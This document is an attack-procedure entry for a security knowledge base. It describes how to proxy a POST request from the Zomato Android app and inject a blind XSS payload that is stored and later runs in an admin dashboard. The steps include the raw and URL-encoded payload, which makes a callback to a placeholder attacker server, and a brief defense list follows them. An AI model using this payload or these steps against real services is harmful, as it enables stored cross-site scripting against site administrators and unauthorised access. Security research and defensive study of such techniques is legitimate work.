---
id: proc-intercept-xss-injection
tags:
  - xss
  - payload-injection
  - proxy-intercept
  - android
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Android
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[JavaScript]]'
updated_at: '2025-12-14T17:30:47.069Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[JavaScript]]'
---
# Intercept-and-Inject-XSS-Payload-in-POST-Request

## Summary

This procedure intercepts an outgoing POST request from the Zomato Android app using a proxy tool, modifies the request body to inject a Blind XSS payload, and forwards it to store the malicious input in the backend for later execution in the admin dashboard.

## Description

The vulnerability stems from unsanitized user input in a POST endpoint on api.zomato.com (redacted path), where data from the app is reflected or stored without escaping in the admin view. By proxying app traffic, the attacker injects a payload like "><img src='http://<my_server_ip>/zomato.php?c=zomato_xss' /> into a parameter. When admins view this data, the img tag triggers a callback to the attacker's server. Prerequisites include an authenticated app session and proxy setup (e.g., Burp Suite configured on the device).

## Requirements

1. Proxy tool installed and running (e.g., Burp Suite with listener on port 8080)
2. Android device configured to proxy traffic (Wi-Fi proxy settings or adb port forwarding)
3. Authenticated Zomato app session
4. Attacker server IP prepared for callback

## Defense

Defensive measures and detection strategies:

- Sanitize and escape all user inputs in POST endpoints using libraries like OWASP ESAPI
- Implement Content Security Policy (CSP) in admin dashboard to block inline scripts and external img srcs
- Log and monitor anomalous POST payloads containing script tags or external URLs
- Use Web Application Firewall (WAF) rules to detect XSS patterns in API requests

## Objectives

1. Intercept the vulnerable POST request from the Android app
2. Inject and URL-encode the XSS payload without breaking the request
3. Store the payload in the backend for admin exposure

## Instructions

### Step 1: Configure Proxy for App Traffic

**Context**: Route Android app requests through the proxy for interception.

On the Android device, set Wi-Fi proxy to the attacker's machine IP and port (e.g., 127.0.0.1:8080). Install the proxy's CA certificate if needed for HTTPS interception.

### Step 2: Trigger and Intercept POST Request

**Context**: Generate the vulnerable request in the app.

In the authenticated app, navigate to the input function and submit data. In the proxy tool, capture the POST to the redacted endpoint on api.zomato.com, which includes headers like X-Zomato-App-Version-Code, X-Zomato-API-Key, X-Access-Token, and Content-Type: application/x-www-form-urlencoded.

**Expected Output**: Raw request displayed in proxy interface, showing POST body parameters.

### Step 3: Modify and Inject Payload

**Context**: Alter the POST body to include the XSS payload.

Identify the injectable parameter (e.g., █████) and append the payload: "><img src='http://<my_server_ip>/zomato.php?c=zomato_xss' />. URL-encode it as: █████="><img+src%3d\"http%3a//<my_server_ip>/zomato.php%3fc%3dzomato_xss\"+/>█████████. Drop and forward the modified request.

**Expected Output**: Server responds with 200 OK; app shows successful submission.

### Step 4: Verify Injection

**Context**: Confirm the payload was accepted without errors.

Check app for no submission failures and monitor backend if possible (though blind, no immediate feedback).

**Expected Output**: No errors; payload stored for later trigger.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]
- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[xss]]
- [[payload-injection]]
- [[proxy-intercept]]
- [[android]]
